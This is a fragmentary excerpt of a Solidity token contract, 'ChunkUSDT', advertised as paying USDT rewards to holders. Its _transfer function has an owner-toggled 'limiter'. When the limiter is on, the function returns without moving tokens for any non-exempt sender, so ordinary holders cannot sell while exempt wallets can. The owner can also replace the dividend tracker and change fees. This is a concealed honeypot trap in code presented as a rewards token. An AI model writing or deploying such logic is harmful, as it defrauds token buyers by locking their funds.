...
// simply hold and you'll receive USDT automatically in your wallet.
// 
//
...
contract ChunkUSDT is ERC20, Ownable {
    ...
    uint256 public swapTokensAtAmount = 40000 * (10**18);
    ...
    address public _marketingWalletAddress = 0x44cA144a21462d1215BD8758ea65B326fD714d77;
    ...
    constructor() public ERC20("ChunkUSDT", "CHUNK") {

    	dividendTracker = new UsdtDividendTracker();
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        UsdtDividendTracker newDividendTracker = UsdtDividendTracker(payable(newAddress));
    ...
    function setLimiter(bool valueNew) external onlyOwner{
        limiter = valueNew;
    }
    ...
    function setUSDTRewardsFee(uint256 value) external onlyOwner{
        require(totalFees.sub(USDTRewardsFee).add(value) < 22, "Please dont set the fee too high");
        USDTRewardsFee = value;
        totalFees = USDTRewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setLiquiditFee(uint256 value) external onlyOwner{
        require(totalFees.sub(liquidityFee).add(value) < 22, "Please dont set the fee too high");
        liquidityFee = value;
        totalFees = USDTRewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setMarketingFee(uint256 value) external onlyOwner{
        require(totalFees.sub(marketingFee).add(value) < 22, "Please dont set the fee too high");
        marketingFee = value;
        totalFees = USDTRewardsFee.add(liquidityFee).add(marketingFee);
    }
    ...
    function _transfer(
        ...
        if(limiter && (!(_isExcludedFromFees[from] || _isExcludedFromFees[to]))){
            require(amount < (10000000 * (10**18)) , "The limiter is active :)");
            return;
        }
...
contract UsdtDividendTracker is Ownable, DividendPayingToken {
    ...
    constructor() public DividendPayingToken("_Dividen_Tracker", "_Dividend_Tracker") {
    	claimWait = 3600;
